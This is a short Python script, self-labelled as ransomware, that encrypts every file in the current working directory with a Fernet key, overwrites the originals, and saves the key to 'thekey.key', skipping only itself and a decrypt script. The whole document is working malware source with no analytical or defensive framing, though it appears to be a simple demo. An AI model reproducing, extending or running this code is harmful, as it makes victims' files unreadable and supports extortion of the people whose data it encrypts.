#!/usr/bin/env python3

# Import important module
import os
from cryptography.fernet import Fernet

# Main ransomware code 

files = []

# Get the name of the script file
script_name = os.path.basename(__file__)

for file in os.listdir():
    # Exclude the script file and any other files that should not be encrypted
    if file == "ramsomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files to encrypt:", files)

# Generate and save encryption key
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypt files
fernet = Fernet(key)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    content_encrypted = fernet.encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)

print("Encryption completed.")
